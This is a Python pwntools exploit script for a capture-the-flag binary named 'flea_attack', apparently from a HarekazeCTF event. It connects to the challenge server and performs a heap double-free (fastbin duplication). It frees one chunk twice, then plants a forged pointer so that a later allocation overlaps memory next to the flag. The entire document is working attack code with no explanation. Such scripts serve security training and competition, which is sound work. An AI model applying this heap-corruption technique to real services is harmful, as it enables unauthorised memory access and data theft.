from pwn import *

context.log_level = "DEBUG"

COMMENT_ADDR = 0x204000
FLAG_ADDR = 0x204080

#p = process("./flea_attack.elf")
p = remote("problem.harekaze.com", 20175)

comment = "."*0x5e + "\x30"

#import time; time.sleep(20)
p.recvuntil(":")
p.send(comment)

def add_name(size, name):
    p.recvuntil("> ")
    p.send("1\n")
    p.recvuntil(": ")
    p.send(str(size) + '\n')
    p.recvuntil(": ")
    p.send(name + '\n')
    assert "Done!\n" == p.readline() # Done
    out = p.readline().split(":")[1]
    line = p.readline() # may be empty
    while not line.strip():
        line = p.readline() # now it shouldn't be
    addr = int(line.split(":")[1], 16)
    return out, addr

def del_name(addr):
    p.recvuntil("> ")
    p.send("2\n")
    p.recvuntil(": ")
    p.send(hex(addr)[2:] + '\n')
    p.readline()

payload = p64(COMMENT_ADDR+0x60-8-2)

size = 26
o1, a1 = add_name(size, "1234567")
o2, a2 = add_name(size, "1234567")
o3, a3 = add_name(size, "1234567")
print hex(a1), hex(a2), hex(a3)
del_name(a1)
del_name(a2)
del_name(a1)
o4, a4 = add_name(size, payload) #  1st
assert a1 == a4
add_name(size, "1234567")  # 2nd
add_name(size, "1234567")  # 3nd
o5, a5 = add_name(size, "."*size)  # 4nd
print "o5: '{}'\na5: {:x}".format(o5, a5)
